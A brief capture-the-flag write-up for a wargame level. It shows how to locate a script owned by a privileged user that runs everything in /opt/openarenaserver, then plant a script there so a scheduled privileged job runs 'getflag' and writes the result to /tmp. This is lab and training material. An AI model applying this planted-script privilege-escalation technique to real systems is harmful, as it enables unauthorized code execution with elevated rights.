# Write up

No particular file in the landing level05 home folder.
We need some starting point, so we check what files flag05 owns : `find / -user 'flag05' -exec readlink -f {} \; 2> /dev/null | grep -v "proc"`
Which gives us two files :
```
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```
Which are the same shell script

This script execute all files in the `/opt/openarenaserver` folder with bash

So I try : `echo "getflag" > /opt/openarenaserver/1.sh; sh /usr/sbin/openarenaserver`
But nope :
```
+ getflag
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```

At this point we can admin that some routine with the rights execute the script every some amount of time
So, we create a new script : `echo "getflag > /tmp/flug" > /opt/openarenaserver/1.sh` and wait
And it's successful, after few seconds, the `/tmp/flug` file contains our flag.
